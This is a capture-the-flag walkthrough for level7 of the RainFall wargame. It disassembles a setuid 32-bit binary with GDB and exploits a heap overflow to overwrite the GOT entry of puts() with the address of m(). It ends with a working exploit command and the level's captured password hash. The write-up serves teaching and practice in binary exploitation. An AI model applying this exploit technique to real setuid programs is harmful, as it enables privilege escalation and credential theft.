## Walkthrough

We list the files in the current home directory.

```bash
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
level7@RainFall:~$ file level7
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped

```

The file is owned by **level8** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```

There are 2 interesting functions: `main()` and `m()` :

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
```

This function: 

- **Aligns the stack**: Adjusts the stack pointer to ensure it is aligned to a 16-byte boundary, adhering to the System V AMD64 ABI calling convention.
- Allocate memory : Invokes the `malloc()` function 4times:

```nasm
0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
```

- The `mov` instruction moves 8 bytes (`0x8` in hexadecimal) into the memory location pointed to by the `esp` register (stack pointer).
- Calls `malloc()` via its address `0x80483f0` to allocate 8bytes. The pointer to the allocated memory returned by `malloc` is stored in the `eax` register.
- The value in `eax` (the allocated memory pointer) is moved to the address `[esp + 0x1c]` on the stack.
- The pointer to the allocated memory is retrieved from `[esp + 0x1c]` and placed in the `eax` register for later use.
- The value `0x1` is written to the memory location pointed to by `eax`.

```nasm
0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
0x08048550 <+47>:	mov    edx,eax
0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
```

- The `mov` instruction moves the value `0x8` (8 bytes) into the memory location pointed to by the `esp` register (stack pointer).
- It calls `malloc()` via its address `0x80483f0` to allocate 8 bytes. The pointer to the allocated memory returned by `malloc` is stored in the `eax` register.
- The value in `eax` (the pointer returned by `malloc`) is moved into the `edx` register.
- The value stored at `[esp + 0x1c]` (a pointer) is moved into `eax`.
- The value in `edx` is stored at the memory location `[eax + 0x4]`, effectively writing the `edx` value 4 bytes after the memory location pointed to by `eax`.

```nasm
 0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
 0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
 0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
 0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
 0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
```

- The `mov` instruction moves the value `0x8` (8 bytes) into the memory location pointed to by the `esp` register (stack pointer).
- It calls `malloc()` via its address `0x80483f0` to allocate 8 bytes. The pointer to the allocated memory returned by `malloc` is stored in the `eax` register.
- The value in `eax` (the pointer returned by `malloc`) is stored at `[esp + 0x18]` on the stack.
- The value stored at `[esp + 0x18]` (the pointer to the allocated memory) is moved into `eax`.
- The value `0x2` is stored at the memory location pointed to by `eax`.

```nasm
0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
0x0804857f <+94>:	mov    edx,eax
0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
0x0804858b <+106>:	add    eax,0x4
0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
0x08048590 <+111>:	mov    edx,eax
0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
```

- The `mov` instruction moves the value `0x8` (8 bytes) into the memory location pointed to by the `esp` register (stack pointer).
- It calls `malloc()` via its address `0x80483f0` to allocate 8 bytes. The pointer to the allocated memory returned by `malloc` is stored in the `eax` register.
- The value in `eax` (the pointer returned by `malloc`) is moved into the `edx` register.
- The value stored at `[esp + 0x18]` (a pointer) is moved into `eax`.
- The value in `edx` is stored at the memory location `[eax + 0x4]`.
- The value stored at `[ebp + 0xc]` is moved into `eax`.
- The value `0x4` is added to `eax`, effectively moving the pointer 4 bytes forward.
- The value stored at the new address pointed to by `eax` is moved into `eax`.
- The value in `eax` is moved into `edx`.
- The value stored at `[esp + 0x1c]` (a pointer) is moved into `eax`.
- The value stored at `[eax + 0x4]` is moved into `eax`.

```nasm
0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
0x0804859d <+124>:	mov    DWORD PTR [esp],eax
0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
0x080485a8 <+135>:	add    eax,0x8
0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
0x080485ad <+140>:	mov    edx,eax
0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
0x080485ba <+153>:	mov    DWORD PTR [esp],eax
0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>

```

- Retrieves the value of `argv[1]`  and copies it through `strcpy()` at address `0x804a018`
- Retrieves the value of `argv[2]`  and copies it through `strcpy()` at address `0x804a038`

```nasm
0x080485c2 <+161>:	mov    edx,0x80486e9
0x080485c7 <+166>:	mov    eax,0x80486eb
0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
```

Preparing the arguments of `fopen(**const char *restrict** *pathname***, const char *restrict** *mode*)` :

```nasm
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```

- Calls `fopen()`  and return a file which is stored in register `%eax`

```nasm
0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
```

Preparing the arguments of `*fgets(char *restrict *s*, int *n*, FILE *restrict *stream*);` : 

- `0x44` is `68` bytes

```nasm
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
```

Calls the `fgets()` function :

```nasm
0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
0x080485fc <+219>:	mov    eax,0x0
0x08048601 <+224>:	leave  
0x08048602 <+225>:	ret
```

Calls the `puts()` function : 

- Resets `%eax` at 0.

```nasm
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

Although it is not called by the program, there is a `m()` function:

```nasm
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
```

The function:

- Moves `0x0` to pointer on pile of the stack `esp`
- Makes call to `time()` which return the time as the number of seconds since the Epoch

### The global offset table - GOT

*“The **Global Offset Table**, or **GOT**, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly,  independent of the memory address where the program’s code or data is loaded at runtime.” -* https://en.wikipedia.org/wiki/Global_Offset_Table

### Overwriting the GOT

https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1 

### Converting the address

To properly inject this address, we need to represent it in **little-endian** format, as this is how memory addresses are stored on the target system. 

**Little-endian** is a way of representing multi-byte data in memory where the **least significant byte** (the "lowest" byte) is stored at the **lowest memory address**, and the **most significant byte** is stored at the highest memory address.

The `puts()` function is located at the address **`0x8049928`**. The little-endian format for the address **`0x8049928`** is:  `\x28\x99\x04\x08`.

```bash
'\x28\x99\x04\x08'
```

The `m()` function is located at the address **`0x080484f4`**. The little-endian format for the address **`0x080484f4`** is:  `\xf4\x84\x04\x08`.

```nasm
'\xf4\x84\x04\x08'
```

### The final command

The final command is :

```nasm
level7@RainFall:~$ ./level7 $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08\x00')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

### Resources

- Global offset table : [https://ctf101.org/binary-exploitation/what-is-the-got/](https://en.wikipedia.org/wiki/Global_Offset_Table)
- Overwriting the GOT : [https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1](https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1)
